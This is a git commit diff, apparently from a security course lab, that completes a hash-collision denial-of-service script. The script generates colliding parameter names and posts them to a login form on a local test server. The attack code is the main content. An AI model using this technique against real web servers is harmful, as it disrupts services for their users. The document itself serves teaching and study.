c7dcd705c61fece8f70282584e845843ed7af230
Martin Eckardt <martin@fast-forward.tech>
2022-11-05 17:13:49 -0400

    Part 2.2 - DoS Attack

--- hashdos.py
+++ hashdos.py
@@ -1,6 +1,9 @@
 from requests import codes, Session
+from collisions import find_collisions
 
 LOGIN_FORM_URL = "http://localhost:8080/login"
+
+key = b'\x00'*16
 
 #This function will send the login form
 #with the colliding parameters you specify.
@@ -17,12 +20,20 @@ def do_login_form(sess, username,password,params=None):
 
 def do_attack():
 	sess = Session()
-  #Choose any valid username and password
-	uname =""
-	pw = ""
-  #Put your colliding inputs in this dictionary as parameters.
-	attack_dict = {}
-	response = do_login_form(sess, uname,pw,attack_dict)
+
+  	#Choose any valid username and password
+	uname ="attacker"
+	pw = "attacker"
+
+  	#Put your colliding inputs in this dictionary as parameters.
+	print("finding collisions")
+	attack_dict = {collision: 0 for collision in find_collisions(key, 5)}
+
+	print("starting attack")
+	response = do_login_form(sess, uname, pw, attack_dict)
+	print("response received")
+	print(response)
+
 
 
 if __name__=='__main__':
